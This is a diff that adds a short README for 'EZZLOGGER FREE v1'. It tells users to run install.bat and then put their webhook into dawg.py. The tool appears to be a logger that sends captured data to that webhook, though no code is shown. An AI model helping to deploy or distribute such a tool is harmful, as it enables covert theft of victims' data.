@@ -1,0 +1,4 @@
+ESAR13B (EZZLOGGER) FREE v1
+
+
+run install.bat and when your done go to dawg.py and edit it and add inside it your webhook and your done ❤️
